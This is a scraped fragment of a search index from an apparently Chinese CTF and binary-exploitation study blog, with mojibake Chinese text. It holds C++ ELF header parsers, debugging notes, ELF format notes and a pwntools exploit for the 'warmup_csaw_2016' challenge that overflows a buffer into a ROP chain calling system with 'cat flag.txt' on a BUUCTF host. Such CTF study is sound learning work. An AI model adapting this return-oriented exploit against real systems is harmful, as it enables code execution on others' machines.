&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include&amp;lt;bits/stdc++.h&amp;gt;
#include&amp;lt;elf.h&amp;gt;
using namespace std;
int scnum,sy;
signed main()
{
    printf(&amp;quot;header:\n&amp;quot;);
    Elf64_Ehdr e64_hd;//å‚è§elf.hå®šä¹‰
    FILE *pt;//å®šä¹‰FILEç±»å‹çš„æŒ‡é’ˆ
    pt=freopen(&amp;quot;babyof&amp;quot;,&amp;quot;r&amp;quot;,stdin);//éœ€è¦åˆ¤æ–­çš„æ–‡ä»¶
    fread(&amp;amp;e64_hd,sizeof(Elf64_Ehdr),1,pt);//ä»æ–‡ä»¶æµè¯»å–æ•°æ®åˆ°e64_hdä¸­
    printf(&amp;quot;Magic number and other info: &amp;quot;);
    for(int i=0;i&amp;lt;16;i++)
    {
        printf(&amp;quot;%02x &amp;quot;,e64_hd.e_ident[i]);
        // cout&amp;lt;&amp;lt;e64_hd.e_ident[i];
    }
    printf(&amp;quot;\n&amp;quot;);
    printf(&amp;quot;Object file type: %x\n&amp;quot;,e64_hd.e_type);
    // cout&amp;lt;&amp;lt;&amp;quot;Object file type: &amp;quot;&amp;lt;&amp;lt;e64_hd.e_type&amp;lt;&amp;lt;endl;
    printf(&amp;quot;Architecture: %lu\n&amp;quot;,e64_hd.e_machine);
    // cout&amp;lt;&amp;lt;&amp;quot;Architecture: &amp;quot;&amp;lt;&amp;lt;e64_hd.e_machine&amp;lt;&amp;lt;endl;
    printf(&amp;quot;Entry point virtual address: 0x%x\n&amp;quot;,e64_hd.e_entry);
    printf(&amp;quot;Program header table file offset: %d(bytes into file)\n&amp;quot;,e64_hd.e_phoff);
    printf(&amp;quot;Section header table file offset: %d(bytes into file)\n&amp;quot;,e64_hd.e_shoff);
    printf(&amp;quot;Processor-specific flags: 0x%x\n&amp;quot;,e64_hd.e_flags);
    printf(&amp;quot;ELF header size in bytes: %d(bytes)\n&amp;quot;,e64_hd.e_ehsize);
    printf(&amp;quot;Program header table entry size: %d(bytes)\n&amp;quot;,e64_hd.e_phentsize);
    printf(&amp;quot;Program header table entry count: %d\n&amp;quot;,e64_hd.e_phnum);
    printf(&amp;quot;Section header table entry size: %d(bytes)\n&amp;quot;,e64_hd.e_shentsize);
    printf(&amp;quot;Section header table entry count: %d\n&amp;quot;,e64_hd.e_shnum);
    printf(&amp;quot;Section header string table index: %d\n\n&amp;quot;,e64_hd.e_shstrndx);
    scnum=e64_hd.e_shnum;
    sy=e64_hd.e_shstrndx;
    // section start
    printf(&amp;quot;section:\n&amp;quot;);
    // Elf64_Shdr *sc;//å‚è§elf.hå®šä¹‰
    Elf64_Shdr sc[scnum];
    fseek(pt, e64_hd.e_shoff, SEEK_SET);//ä»æ–‡ä»¶å¼€å¤´å¼€å§‹åç§»e64_hd.e_shoff
    fread(sc,sizeof(Elf64_Shdr)*scnum,1,pt);//ä»æ–‡ä»¶æµè¯»å–æ•°æ®åˆ°scä¸­
    printf(&amp;quot;  \ttype      addr      offset    size\n&amp;quot;);
    for(int i=0;i&amp;lt;scnum;i++)
    {
        printf(&amp;quot;num:%d\t%-10x%-10x%-10x%-10d\n&amp;quot;,i+1,sc[i].sh_type,sc[i].sh_addr,sc[i].sh_offset,sc[i].sh_size);
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;warmup_csaw_2016_1:&lt;br&gt;
æ­¤é¢˜64ä½ä¿æŠ¤å…¨å…³ï¼Œf12å‘ç°æœ‰&lt;code&gt;systemå’Œcat flag.txt&lt;/code&gt;å¯ä»¥æ ¹æ®æç¤ºç›´æ¥æº¢å‡ºåˆ°åé—¨åœ°å€ï¼Œä¹Ÿå¯ä»¥ä¼ å‚ä½œç­”&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1673972525899.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
# context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,28711)
elf=ELF(&amp;quot;./222&amp;quot;)
sys_addr=elf.sym[b&amp;quot;system&amp;quot;]
# sys_addr=0x400378
# ret_addr=0x4004a1
str_flag_addr=next(elf.search(b&amp;quot;cat flag.txt&amp;quot;))
# str_flag_addr=0x400734
pop_rdi_addr=0x400713
payload=cyclic(0x48)+p64(pop_rdi_addr)+p64(str_flag_addr)+p64(sys_addr)
io.sendline(payload)
io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040070c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040070e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400710 : pop r14 ; pop r15 ; ret
# 0x0000000000400712 : pop r15 ; ret
# 0x000000000040070b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040070f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400565 : pop rbp ; ret
# 0x0000000000400713 : pop rdi ; ret
# 0x0000000000400711 : pop rsi ; pop r15 ; ret
# 0x000000000040070d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004004a1 : ret
# 0x0000000000400595 : ret 0xc148

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
">week3ä½œä¸š</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/4zZZpFGKf/"" data-c="
          &lt;ul&gt;
&lt;li&gt;ä¸€å¼€å§‹çš„contextæ¨¡æ¿å¦‚ä¸‹&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;
context.log_level = &#39;debug&#39;
context.arch=&#39;amd64&#39;
context.os=&#39;linux&#39; #å‰ä¸‰é¡¹å¯æ ¹æ®å®é™…æƒ…å†µæ›´æ”¹
context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;] #éœ€è¦é…åˆtmuxä½¿ç”¨ï¼Œå¼€å¯gdbè°ƒè¯•å‰éœ€æ‰“å¼€tmux

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;ä½¿ç”¨tmuxå¿«æ·é”®å”¤èµ·æ–¹å¼ä¸º &lt;code&gt;ctrl+b&lt;/code&gt; ï¼Œåæ¥å…¶å®ƒé”®ï¼Œå¦‚&lt;code&gt;ctrl+b o&lt;/code&gt; å¯ä»¥åˆ‡æ¢åˆ†å±çš„&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1673200645360.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
">pwndbgè°ƒè¯•æ³¨æ„äº‹é¡¹</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/diY6jAN2C/"" data-c="
          &lt;ul&gt;
&lt;li&gt;ELFæ–‡ä»¶ç›¸å…³&lt;a href=&#34;https://oraclepi.tech/k_3A9NnKQ&#34;&gt;PWNç¯‡-äºŒè¿›åˆ¶æ–‡ä»¶&lt;/a&gt;&lt;br&gt;
ELF headerè§£æå™¨&lt;br&gt;
æŸ¥çœ‹&lt;code&gt;elf.h&lt;/code&gt;ä¸­æœ‰å®šä¹‰&lt;br&gt;
åˆ™å¯ä»¥ä»æ–‡ä»¶æµä¸­è¯»å…¥æ•°æ®åˆ°æŒ‡é’ˆä¸­ï¼Œè¿›è€Œè¾“å‡ºELF Headerä¿¡æ¯&lt;br&gt;
ä»¥ä¸‹ä»£ç åœ¨Windowsä¸­ç¼–è¯‘éœ€è¦å°†&lt;code&gt;elf.h&lt;/code&gt;æ–‡ä»¶å¤åˆ¶åˆ°&lt;code&gt;/include&lt;/code&gt;ç›®å½•ä¸‹&lt;br&gt;
32ä½ä¸64ä½åœ¨æ–‡ä»¶å¤´æœ‰åŒºåˆ«ï¼š&lt;img src=&#34;https://oraclepi.tech/post-images/1672930092109.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
64ä½ç‰ˆæœ¬:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include&amp;lt;bits/stdc++.h&amp;gt;
#include&amp;lt;elf.h&amp;gt;
using namespace std;
signed main()
{
    Elf64_Ehdr e64_hd;//å‚è§elf.hå®šä¹‰
    FILE *pt;//å®šä¹‰FILEç±»å‹çš„æŒ‡é’ˆ
    pt=freopen(&amp;quot;question_5_x64&amp;quot;,&amp;quot;r&amp;quot;,stdin);//éœ€è¦åˆ¤æ–­çš„æ–‡ä»¶
    fread(&amp;amp;e64_hd,sizeof(Elf64_Ehdr),1,pt);//ä»æ–‡ä»¶æµè¯»å–æ•°æ®åˆ°e64_hdä¸­
    printf(&amp;quot;Magic number and other info: &amp;quot;);
    for(int i=0;i&amp;lt;16;i++)
    {
        printf(&amp;quot;%02x &amp;quot;,e64_hd.e_ident[i]);
        // cout&amp;lt;&amp;lt;e64_hd.e_ident[i];
    }
    printf(&amp;quot;\n&amp;quot;);
    printf(&amp;quot;Object file type: %x\n&amp;quot;,e64_hd.e_type);
    // cout&amp;lt;&amp;lt;&amp;quot;Object file type: &amp;quot;&amp;lt;&amp;lt;e64_hd.e_type&amp;lt;&amp;lt;endl;
    printf(&amp;quot;Architecture: %lu\n&amp;quot;,e64_hd.e_machine);
    // cout&amp;lt;&amp;lt;&amp;quot;Architecture: &amp;quot;&amp;lt;&amp;lt;e64_hd.e_machine&amp;lt;&amp;lt;endl;
    printf(&amp;quot;Entry point virtual address: 0x%x\n&amp;quot;,e64_hd.e_entry);
    printf(&amp;quot;Program header table file offset: %d(bytes into file)\n&amp;quot;,e64_hd.e_phoff);
    printf(&amp;quot;Section header table file offset: %d(bytes into file)\n&amp;quot;,e64_hd.e_shoff);
    printf(&amp;quot;Processor-specific flags: 0x%x\n&amp;quot;,e64_hd.e_flags);
    printf(&amp;quot;ELF header size in bytes: %d(bytes)\n&amp;quot;,e64_hd.e_ehsize);
    printf(&amp;quot;Program header table entry size: %d(bytes)\n&amp;quot;,e64_hd.e_phentsize);
    printf(&amp;quot;Program header table entry count: %d\n&amp;quot;,e64_hd.e_phnum);
    printf(&amp;quot;Section header table entry size: %d(bytes)\n&amp;quot;,e64_hd.e_shentsize);
    printf(&amp;quot;Section header table entry count: %d\n&amp;quot;,e64_hd.e_shnum);
    printf(&amp;quot;Section header string table index: %d\n&amp;quot;,e64_hd.e_shstrndx);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆªå›¾ä¸&lt;code&gt;readelf -h&lt;/code&gt;å¯¹æ¯”ï¼š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1672929898271.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;/br&gt;&lt;/br&gt;&lt;br&gt;
32ä½ç‰ˆæœ¬ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include&amp;lt;bits/stdc++.h&amp;gt;
#include&amp;lt;elf.h&amp;gt;
using namespace std;
signed main()
{
    Elf32_Ehdr e32_hd;//å‚è§elf.hå®šä¹‰
    FILE *pt;//å®šä¹‰FILEç±»å‹çš„æŒ‡é’ˆ
    pt=freopen(&amp;quot;question_5_x86&amp;quot;,&amp;quot;r&amp;quot;,stdin);//éœ€è¦åˆ¤æ–­çš„æ–‡ä»¶
    fread(&amp;amp;e32_hd,sizeof(Elf32_Ehdr),1,pt);//ä»æ–‡ä»¶æµè¯»å–æ•°æ®åˆ°e32_hdä¸­
    printf(&amp;quot;Magic number and other info: &amp;quot;);
    for(int i=0;i&amp;lt;16;i++)
    {
        printf(&amp;quot;%02x &amp;quot;,e32_hd.e_ident[i]);
        // cout&amp;lt;&amp;lt;e32_hd.e_ident[i];
    }
    printf(&amp;quot;\n&amp;quot;);
    printf(&amp;quot;Object file type: %x\n&amp;quot;,e32_hd.e_type);
    // cout&amp;lt;&amp;lt;&amp;quot;Object file type: &amp;quot;&amp;lt;&amp;lt;e32_hd.e_type&amp;lt;&amp;lt;endl;
    printf(&amp;quot;Architecture: %lu\n&amp;quot;,e32_hd.e_machine);
    // cout&amp;lt;&amp;lt;&amp;quot;Architecture: &amp;quot;&amp;lt;&amp;lt;e32_hd.e_machine&amp;lt;&amp;lt;endl;
    printf(&amp;quot;Entry point virtual address: 0x%x\n&amp;quot;,e32_hd.e_entry);
    printf(&amp;quot;Program header table file offset: %d(bytes into file)\n&amp;quot;,e32_hd.e_phoff);
    printf(&amp;quot;Section header table file offset: %d(bytes into file)\n&amp;quot;,e32_hd.e_shoff);
    printf(&amp;quot;Processor-specific flags: 0x%x\n&amp;quot;,e32_hd.e_flags);
    printf(&amp;quot;ELF header size in bytes: %d(bytes)\n&amp;quot;,e32_hd.e_ehsize);
    printf(&amp;quot;Program header table entry size: %d(bytes)\n&amp;quot;,e32_hd.e_phentsize);
    printf(&amp;quot;Program header table entry count: %d\n&amp;quot;,e32_hd.e_phnum);
    printf(&amp;quot;Section header table entry size: %d(bytes)\n&amp;quot;,e32_hd.e_shentsize);
    printf(&amp;quot;Section header table entry count: %d\n&amp;quot;,e32_hd.e_shnum);
    printf(&amp;quot;Section header string table index: %d\n&amp;quot;,e32_hd.e_shstrndx);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆªå›¾ä¸&lt;code&gt;readelf -h&lt;/code&gt;å¯¹æ¯”ï¼š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1672930001146.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
">PWN phase1</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/RVZOEWv6Q/"" data-c="
          &lt;ul&gt;
&lt;li&gt;
&lt;p&gt;spå’Œbpå¯»å€æœ‰åŒºåˆ«&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å¹³è¡¡æ ˆé—®é¢˜&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1671956912081.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å¦‚&lt;a href=&#34;C:%5CUsers%5COrrr%5CDesktop%5CCTF%5Cpwn%5Cpc%5Cun%5Cret2libc&#34;&gt;ret2libc&lt;/a&gt;åŠ&lt;a href=&#34;C:%5CUsers%5COrrr%5CDesktop%5CCTF%5Cpwn%5Cpc%5Cun%5Cret2libc&#34;&gt;exp&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#coding:utf8
from pwn import *

context.log_level = &#39;debug&#39;
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;] #pwndbgé€‚é…è¯¥ç»ˆç«¯ï¼ŒåŠ ä¸Šè¿™å¥è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨ä¸€ä¸ªç»ˆç«¯è¿›è¡Œåˆ†å±è°ƒè¯•ï¼Œåˆ†å±çš„åˆ‡æ¢ä¸€ç±»çš„æ“ä½œè¿˜éœ€è¦æŸ¥çœ‹ä¸€ä¸‹tmuxå¦‚ä½•ä½¿ç”¨

ip = &#39;&#39;
port = 0
process_name = &#39;&#39;
if args.G:           #è¿˜æ²¡ææ¸…æ¥šæ˜¯ä»€ä¹ˆåŸç†ï¼Œä½†æ˜¯ç”¨æ³•å°±æ˜¯åœ¨å‚æ•°åˆ—è¡¨ä¸­åŠ ä¸ªGå°±å¯ä»¥è¿›å…¥æœ¬åœ°è°ƒè¯•çš„åˆ†æ”¯
    sh = process(process_name)
    addr=&#39;&#39;
    gdb.attach(sh, &amp;quot;b *&amp;quot; + addr)  
else:
    sh = remote(ip,port)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å…³äº`close&#39;&lt;img src=&#34;https://oraclepi.tech/post-images/1672932863356.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;expè„šæœ¬é‡Œé¢å†™payloadé¡ºåºä¸èƒ½é”™&lt;/li&gt;
&lt;li&gt;systemå’Œcall _systemä»¥åŠ16å­—èŠ‚å¯¹é½&lt;a href=&#34;https://www.cnblogs.com/kingbridge/articles/15839185.html&#34;&gt;link&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;patchelf --set-interpreter  &lt;code&gt;ld* file&lt;/code&gt; ./pwn&lt;/li&gt;
&lt;li&gt;patchelf --replace-needed &lt;code&gt;old libc* file    new libc* file &lt;/code&gt; ./pwn&lt;/li&gt;
&lt;li&gt;set debug-file-directory  ./.debug/&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;recvæ³¨æ„äº‹é¡¹ï¼š&lt;br&gt;
&lt;a href=&#34;https://blog.csdn.net/hanqdi_/article/details/107164199?spm=1001.2101.3001.6650.1&amp;amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-107164199-blog-122901902.pc_relevant_multi_platform_whitelistv3&amp;amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-107164199-blog-122901902.pc_relevant_multi_platform_whitelistv3&amp;amp;utm_relevant_index=2&#34;&gt;link&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æ ˆè¿ç§»ï¼š&lt;a href=&#34;https://blog.csdn.net/mcmuyanga/article/details/109728490&#34;&gt;link&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://www.freebuf.com/articles/network/340303.html&#34;&gt;link&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;pwndbgæ‰“æ–­ç‚¹ å¼€å¯pieçš„ä½¿ç”¨ gdb &lt;em&gt;$rebase(0x&lt;/em&gt;)&lt;/p&gt;
&lt;p&gt;signinç»•è¿‡tail ./*&lt;/p&gt;
&lt;p&gt;mp_.tcache_binsæ€ä¹ˆæ‰¾ï¼Œå“ˆå“ˆï¼Œsearch -8 å †åŸºå€ï¼Œ&lt;br&gt;
æ‰¾åˆ°åœ¨libc.soä¸Šçš„åœ°å€ï¼Œè¯¥åœ°å€åŠ 8å°±æ˜¯mp_.tcache_binsçš„åœ°å€&lt;/p&gt;
">PWNç›¸å…³</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/k_3A9NnKQ/"" data-c="
          &lt;h2&gt;ELFæ–‡ä»¶(Linuxä¸Šè¿è¡Œ,è¢«ç»Ÿç§°ä¸ºobject file)&lt;/h2&gt;
&lt;h3&gt;æ–‡ä»¶ç±»å‹:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;å¯æ‰§è¡Œæ–‡ä»¶(.exec)&lt;/code&gt;:Linkerå¯¹.oæ–‡ä»¶è¿›è¡Œå¤„ç†è¾“å‡ºçš„æ–‡ä»¶ï¼Œè¿›ç¨‹æ˜ åƒ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;å¯é‡å®šä½æ–‡ä»¶(.rel)&lt;/code&gt;:ç¼–è¯‘å™¨å’Œæ±‡ç¼–å™¨äº§ç”Ÿçš„.oæ–‡ä»¶ï¼Œè¢«Linkeræ‰€å¤„ç†&lt;/li&gt;
&lt;li&gt;&lt;code&gt;å…±äº«ç›®æ ‡æ–‡ä»¶(.dyn)&lt;/code&gt;:åŠ¨æ€åº“æ–‡ä»¶.so&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;æ–‡ä»¶ç»„æˆ:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ELFæ–‡ä»¶å¤´&lt;/strong&gt;:&lt;br&gt;
åŒ…å«æ–‡ä»¶åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶å¤´éƒ¨å­˜åœ¨&lt;code&gt;é­”æœ¯å­—ç¬¦(7f 45 4c 46)&lt;/code&gt;,å³å­—ç¬¦ä¸²&lt;code&gt;\177ELF&lt;/code&gt;ï¼Œå½“æ–‡ä»¶è¢«æ˜ å°„åˆ°å†…å­˜æ—¶ï¼Œå¯ä»¥é€šè¿‡æœç´¢è¯¥å­—ç¬¦ç¡®å®šæ˜ å°„åœ°å€ï¼Œdumpå†…å­˜æ—¶æœ‰ç”¨&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34;&gt;#define EI_NIDENT 16
typedef struct{
    /*ELFçš„ä¸€äº›æ ‡è¯†ä¿¡æ¯ï¼Œå›ºå®šå€¼*/
    unsigned char e_ident[EI_NIDENT];
    /*ç›®æ ‡æ–‡ä»¶ç±»å‹ï¼š1-å¯é‡å®šä½æ–‡ä»¶ï¼Œ2-å¯æ‰§è¡Œæ–‡ä»¶ï¼Œ3-å…±äº«ç›®æ ‡æ–‡ä»¶ç­‰*/
    Elf32_Half e_type;
    /*æ–‡ä»¶çš„ç›®æ ‡ä½“ç³»ç»“æ„ç±»å‹ï¼š3-intel 80386*/
    Elf32_Half e_machine;
    /*ç›®æ ‡æ–‡ä»¶ç‰ˆæœ¬ï¼š1-å½“å‰ç‰ˆæœ¬*/
    Elf32_Word e_version;
    /*ç¨‹åºå…¥å£çš„è™šæ‹Ÿåœ°å€ï¼Œå¦‚æœæ²¡æœ‰å…¥å£ï¼Œå¯ä¸º0*/
    Elf32_Addr e_entry;
    /*ç¨‹åºå¤´è¡¨(segment header table)çš„åç§»é‡ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå¯ä¸º0*/
    Elf32_Off e_phoff;
    /*èŠ‚åŒºå¤´è¡¨(section header table)çš„åç§»é‡ï¼Œæ²¡æœ‰å¯ä¸º0*/
    Elf32_Off e_shoff;
    /*ä¸æ–‡ä»¶ç›¸å…³çš„ï¼Œç‰¹å®šäºå¤„ç†å™¨çš„æ ‡å¿—*/
    Elf32_Word e_flags;
    /*ELFå¤´éƒ¨çš„å¤§å°ï¼Œå•ä½å­—èŠ‚*/
    Elf32_Half e_ehsize;
    /*ç¨‹åºå¤´è¡¨æ¯ä¸ªè¡¨é¡¹çš„å¤§å°ï¼Œå•ä½å­—èŠ‚*/
    Elf32_Half e_phentsize;
    /*ç¨‹åºå¤´è¡¨è¡¨é¡¹çš„ä¸ªæ•°*/
    Elf32_Half e_phnum;
    /*èŠ‚åŒºå¤´è¡¨æ¯ä¸ªè¡¨é¡¹çš„å¤§å°ï¼Œå•ä½å­—èŠ‚*/
    Elf32_Half e_shentsize;
    /*èŠ‚åŒºå¤´è¡¨è¡¨é¡¹çš„æ•°ç›®*/
    Elf32_Half e_shnum;
    /*æŸäº›èŠ‚åŒºä¸­åŒ…å«å›ºå®šå¤§å°çš„é¡¹ç›®ï¼Œå¦‚ç¬¦å·è¡¨ã€‚å¯¹äºè¿™ç±»èŠ‚åŒºï¼Œæ­¤æˆå‘˜ç»™å‡ºæ¯ä¸ªè¡¨é¡¹çš„é•¿åº¦å­—èŠ‚æ•°ã€‚*/
    Elf32_Half e_shstrndx;
}Elf32_Ehdr;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;èŠ‚å¤´è¡¨(å¯å»ä»¥å¢åŠ åç¼–è¯‘å™¨åˆ†æéš¾åº¦)&lt;/strong&gt;ï¼š&lt;br&gt;
ç›®æ ‡æ–‡ä»¶çš„èŠ‚ä¿¡æ¯ä¿å­˜åœ¨èŠ‚å¤´è¡¨ï¼Œè¡¨çš„æ¯ä¸€é¡¹éƒ½æ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œè®°å½•èŠ‚çš„åå­—ã€é•¿åº¦ã€åç§»ã€è¯»å†™æƒé™ç­‰ä¿¡æ¯&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;å¯æ‰§è¡Œæ–‡ä»¶çš„è£…è½½:&lt;/h3&gt;
&lt;p&gt;è¯¦è§&lt;a href=&#34;https://zhuanlan.zhihu.com/p/127821301&#34;&gt;çŸ¥ä¹ä¸“æ &lt;/a&gt;&lt;br&gt;
&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h2&gt;é™æ€é“¾æ¥&lt;/h2&gt;
&lt;h3&gt;åœ°å€ç©ºé—´åˆ†é…(å°†ç›®æ ‡é“¾æ¥ä¸ºå¯æ‰§è¡Œæ–‡ä»¶æ—¶)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;æŒ‰åºå åŠ &lt;br&gt;
å½“ç›®æ ‡æ–‡ä»¶è¿‡å¤šæ—¶ï¼Œè¾“å‡ºçš„å¯æ‰§è¡Œæ–‡ä»¶éå¸¸é›¶æ•£ï¼Œä¸”æ®µçš„è£…è½½åœ°å€å’Œç©ºé—´ä»¥é¡µä¸ºå•ä½å¯¹é½é€ æˆå†…å­˜æµªè´¹&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1665370739153.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç›¸ä¼¼èŠ‚åˆå¹¶&lt;br&gt;
å°†ä¸åŒç›®æ ‡æ–‡ä»¶çš„ç›¸åŒå±æ€§çš„èŠ‚åˆå¹¶ä¸ºä¸€ä¸ªèŠ‚&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1665370746247.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;é™æ€é“¾æ¥è¿‡ç¨‹&lt;/h3&gt;
&lt;p&gt;ç¬¦å·è§£æ(ç¬¦å·çš„å¼•ç”¨ä¸å…¶å®šä¹‰ç›¸å…³è”)&lt;br&gt;
é‡å®šä½(å°†ç¬¦å·çš„å®šä¹‰ä¸å†…å­˜åœ°å€ç›¸å…³è”ï¼Œç„¶åä¿®æ”¹å…¶å¼•ç”¨ï¼Œä½¿å…¶æŒ‡å‘è¿™äº›å†…å­˜åœ°å€)&lt;/p&gt;
&lt;h3&gt;é™æ€é“¾æ¥åº“&lt;/h3&gt;
&lt;p&gt;&lt;s&gt;ç±»ä¼¼CPPå¤´æ–‡ä»¶&lt;/s&gt;&lt;br&gt;
&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h2&gt;åŠ¨æ€é“¾æ¥&lt;/h2&gt;
&lt;p&gt;åœ¨è¿è¡Œæˆ–è£…è½½æ—¶ï¼Œåœ¨å†…å­˜ä¸­å®Œæˆé“¾æ¥çš„è¿‡ç¨‹&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1665371493342.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3&gt;ä½ç½®æ— å…³ä»£ç &lt;/h3&gt;
&lt;p&gt;åœ°å€æ— å…³ä»£ç (è‹±æ–‡: position-independent codeï¼Œç¼©å†™ä¸º&lt;code&gt;PIC&lt;/code&gt;)ï¼Œåˆç§°åœ°å€æ— å…³å¯æ‰§è¡Œæ–‡ä»¶(è‹±æ–‡:&lt;br&gt;
position-independent executableï¼Œç¼©å†™ä¸º&lt;code&gt;PIE&lt;/code&gt;) ï¼Œæ˜¯æŒ‡å¯åœ¨ä¸»å­˜å‚¨å™¨ä¸­ä»»æ„ä½ç½®æ­£ç¡®åœ°è¿è¡Œï¼Œ&lt;br&gt;
è€Œä¸å—å…¶ç»å¯¹åœ°å€å½±å“çš„ä¸€ç§æœºå™¨ç &lt;/p&gt;
&lt;h3&gt;å»¶è¿Ÿç»‘å®š&lt;h3&gt;
&lt;p&gt;å»¶è¿Ÿç»‘å®š(Lazy Binding)æ˜¯åŠ¨æ€é“¾æ¥å™¨ç”¨æ¥å‡å°‘ç¨‹åºå¯åŠ¨æ—¶é—´çš„ä¸€ç§æŠ€æœ¯ã€‚ å»¶è¿Ÿç»‘å®šå°±æ˜¯åœ¨å‡½æ•°ç¬¬ä¸€æ¬¡è¢«è°ƒç”¨çš„æ—¶å€™å†å’Œå‡½æ•°åœ°å€ç»‘å®šã€‚&lt;/p&gt;
">PWNç¯‡-äºŒè¿›åˆ¶æ–‡ä»¶</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/about/"" data-c="
          &lt;p&gt;å•¥ä¹Ÿä¸ä¼š&lt;br&gt;
member of ChaMd5&lt;/p&gt;
&lt;p&gt;cXElM0E5MTg1Njk2MTM=&lt;/p&gt;
">ABout</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/xian-duan-shu-wei-hu-qu-jian-zui-zhi-wen-ti/"" data-c="
          &lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;é¢˜é¢&lt;/strong&gt;&lt;br&gt;
ç»™å®šç»™å®šå«nä¸ªæ•°çš„æ•°ç»„A[N],æ±‚åŒºé—´[L,R]çš„å’Œ&lt;br&gt;
æ•°ç»„ä¸ªæ•°ä¸ºn,qæ¬¡æŸ¥è¯¢åŒºé—´l,r;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;æ•°æ®èŒƒå›´&lt;/strong&gt;&lt;br&gt;
